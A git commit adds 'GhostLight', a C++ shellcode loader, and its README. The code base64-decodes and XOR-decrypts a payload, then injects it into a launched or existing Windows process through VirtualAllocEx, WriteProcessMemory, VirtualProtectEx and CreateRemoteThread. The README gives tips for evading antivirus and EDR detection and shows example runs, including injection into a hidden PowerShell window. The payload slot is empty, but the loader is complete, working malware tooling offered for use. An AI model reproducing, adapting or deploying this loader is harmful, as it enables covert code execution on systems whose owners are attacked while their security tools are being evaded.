bf7a9cc8695f264147e4c756e6b8116b7a118c9f
Kyle <kyle@mistele.com>
2021-06-29 22:34:47 +0000

    add ghostlight skeleton files

---
+++ CPP/GhostLight/GhostLight/GhostLight.cpp
@@ -0,0 +1,208 @@
+// GhostLight.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+
+#include <iostream>
+#include <Windows.h>
+#include "base64.h"
+#include <string>
+
+
+using std::cout;
+using std::endl;
+using std::string;
+
+// DATA TYPES
+enum ExecutionMode {
+	EXEC = 1,
+	PID = 2
+};
+
+// GLOBALS
+bool DEBUG_MODE = false;
+ExecutionMode E_MODE;
+int TARGET_PID;
+char* LAUNCH_COMMAND;
+
+
+// THE DECRYPT METHOD, THIS IS SOMETHING THAT NEEDS TO BE WRITTEN DEPENDING ON HOW YOUR SC IS GENERATED/ENCRYPTED
+// DECRYPT IN PLACE OR CREATE ANEW ONE, BUT RETURN IT EITHER WAY
+unsigned char* decrypt(unsigned char*, size_t);
+
+// THE RUNNER METHOD, THIS IS PROVIDED
+void run(unsigned char*, size_t);
+
+int main(int argc, char** argv)
+{
+	// HANDLE ARGUMENT FOR PROCESS TO SPAWN
+	if (argc < 3) {
+		cout << "Invalid usage!" << endl;
+		exit(1);
+	}
+
+	// DEAL WITH DEBUG MODE
+	if (argc >= 4) {
+		char d[] = "debug";
+		if (strcmp(argv[3], d) == 0) {
+			cout << "Debug mode!" << endl;
+			DEBUG_MODE = true;
+		}
+	}
+
+	if (DEBUG_MODE) {
+		for (size_t i = 0; i < argc; i++) {
+			cout << i << ": " << argv[i] << endl;
+		}
+	}
+
+	// HANDLE MODE ARGUMENT
+	char* modeStr = argv[1];
+	char* argString = argv[2];
+	if (strcmp(modeStr, "PID") == 0) {
+		// EXECUTE BY CREATING A NEW PROCESS TO INJECT INTO
+		E_MODE = PID;
+		TARGET_PID = atoi(argString);
+
+	}
+	else if (strcmp(modeStr, "EXEC") == 0) {
+		// EXECUTE BY INJECTING INTO AN EXISTING PROCESS WITH PID
+		E_MODE = EXEC;
+		cout << argv[2] << endl;
+		LAUNCH_COMMAND = argString;
+		cout << LAUNCH_COMMAND << endl;
+	}
+	else {
+		if (DEBUG_MODE) cout << "Error with execution mode: must be EXEC or PID" << endl;
+		exit(2);
+	}
+
+
+	// IMPORTANT! BASE64 ENCODED SC GOES HERE
+	string encodedBytes = "";
+
+	// BASE64 DECODE THE STRING TO GET BYTES
+	string decodedBytes = base64_decode(encodedBytes);
+	unsigned char* encryptedBytes = (unsigned char*)decodedBytes.c_str();
+	size_t bufLen = decodedBytes.length();
+
+	// DECRYPT THE BYTES
+	unsigned char* decr = decrypt(encryptedBytes, bufLen);
+
+	// RUN THE SC
+	run(decr, bufLen);
+
+	return 0;
+
+}
+
+
+// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
+unsigned char* decrypt(unsigned char* encryptedBytes, size_t length) {
+
+	const unsigned char xKey = 35;
+
+	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
+
+	for (size_t i = 0; i < length; i++) {
+		decrData[i] = encryptedBytes[i] ^ xKey;
+	}
+	decrData[length] = '\x00';
+	return decrData;
+}
+
+void run(unsigned char* sc, size_t scLen) {
+
+	// NOW THE FUN BEGINS
+	HANDLE processHandle = NULL;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+	BOOL success;
+
+	// SWITCH DEPENDING ON THE EXECUTION MODE
+	if (E_MODE == EXEC) {
+		// EXECUTE AN APPLICATION LIKE IEXPLORE TO TARGET
+		LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
+		LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
+		success = CreateProcessA(
+			NULL,
+			LAUNCH_COMMAND,
+			NULL,
+			NULL,
+			NULL,
+			NORMAL_PRIORITY_CLASS,
+			NULL,
+			NULL,
+			pStartupInfo,
+			pProcessInfo
+		);
+		if (!success) {
+			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " failed: " << success << endl;
+			exit(3);
+		}
+		else {
+			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " succeeded!" << endl;
+		}
+
+		// GET THE PROCESS HANDLE
+		processHandle = pProcessInfo->hProcess;
+	}
+	else if (E_MODE == PID) {
+
+		// OPEN PROCESS WITH THE TARGET PID
+		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)TARGET_PID);
+	}
+	if (!processHandle) {
+		if (DEBUG_MODE) cout << "Failed to get process Handle." << endl;
+
+		exit(4);
+	}
+	else {
+		if (DEBUG_MODE)  cout << "Got process handle!" << endl;
+	}
+
+
+	// ALLOCATE SPACE INSIDE THE REMOTE PROCESS
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, scLen, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+	if (!remoteBuffer) {
+		if (DEBUG_MODE) cout << "Failed to create remote buffer in target process" << endl;
+		exit(5);
+	}
+	else {
+		if (DEBUG_MODE) cout << "Allocating space (readwrite) succeeded!" << endl;
+	}
+
+	// WRITE PROCESS MEMORY
+	success = WriteProcessMemory(processHandle, remoteBuffer, sc, scLen, NULL);
+	if (!success) {
+		if (DEBUG_MODE) cout << "Failed to write process memory" << endl;
+		exit(6);
+	}
+	else {
+		if (DEBUG_MODE) cout << "Write Process Memory succeeded!" << endl;
+	}
+
+	PDWORD oldProtectOption = new DWORD();
+	*oldProtectOption = PAGE_READWRITE;
+
+	// IMPORTANT! IF YOUR SHELLCODE IS POLYMORPHIC OR OTHERWISE SELF-MODIFYING THEN YOU NEED TO SWITCH "PAGE_EXECUTE" WITH "PAGE_READWRITE"
+	success = VirtualProtectEx(processHandle, remoteBuffer, scLen, PAGE_EXECUTE, oldProtectOption);
+	if (!success) {
+		if (DEBUG_MODE) cout << "Failed to change memory protection to execute only" << endl;
+	}
+	else {
+		if (DEBUG_MODE) cout << "Successfully changed memory protection to execute only" << endl;
+	}
+
+
+	// CREATE THREAD AND EXECUTE
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	if (!remoteThread) {
+		if (DEBUG_MODE) cout << "Failed to create remote thread" << endl;
+		exit(7);
+	}
+	else {
+		if (DEBUG_MODE) cout << "Successfully created and executing thread in remote thread in" << endl;
+	}
+
+	CloseHandle(processHandle);
+
+}
---
+++ CPP/GhostLight/README.md
@@ -0,0 +1,46 @@
+# GhostLight
+GhostLight is a C++ shellcode loader that uses `CreateRemoteThread` to inject shellcode into a process. 
+
+## How it Works
+1. Create a new process by launching a chosen executable
+2. Use the handle on the launched process to reserve memory in the new process
+3. Inject shellcode into that new RWX memory
+4. Create a new thread in that process to run the shellcode
+
+### Very important addendum
+Lots of shellcode loaders take the easy way out by using `VirtualAllocEx` to allocate `PAGE_EXECUTE_READWRITE` (rwx) memory. This type of memory is often considered suspicious, 
+and it is obvious to AV/EDR and may be easily detected.
+In this loader, I have elected to allocate the memory as `PAGE_READWRITE`, and then use `VirtualProtectEx` to change the protection to `PAGE_EXECUTE` after injecting the shellcode but
+BEFORE creating the thread. 
+
+**HOWEVER** - if you are using a self-decoding or self-decrypting payload, this will not work, and you will get an error and a crash. I have designed the loader to use non-self-editing 
+shellcode that is encrypted in some way, and then encoded in base64: the loader decodes the shellcode and then decrypts it before executing it. Instead of relying on self-editing shellcode
+consider using normal shellcode that is not self-modifying, and then encrypting it yourself (easy to do with Python and XOR).
+
+**If you supply your own encryption on a non-self-encrypting shellcode**, you must modify the `decrypt` function to perform the decryption.**
+
+**If you are determined to use self-decrypting or self-decoding shellcode, you probably need to nuke the decryption routing in the loader, and in the call to** `VirtualProtectEx` 
+** you need to specify `PAGE_EXECUTE_READWRITE` instead of `PAGE_EXECUTE`. Be forewarned that this may increase detections.**
+
+## Usage
+```
+ghostlight.exe LaunchType Target [Debug]
+```
+
+Note: all arguments are positional.
+* `LaunchType`: required positional argument. Permitted values:
+	* `PID`: target an existing process
+	* `EXEC`: specify an executable to run via command line
+* `Target`: required positional argument. Permitted values:
+	* if `LaunchType` is `PID`: the PID of an existing process to inject shellcode into
+	* if `LaunchType` is `EXEC`: the path (and arguments?) of an executable to launch. Make sure to double-quote this value if there are spaces.
+* `Debug`: optional positional argument. If set to `debug`, then will print extra debugging information.
+
+### Examples:
+```
+ghostlight.exe PID 5268 debug
+
+ghostlight.exe EXEC "C:/program files/internet explorer/iexplore.exe" debug
+
+ghostlight.exe EXEC "powershell.exe -windowstyle hidden" debug
+```
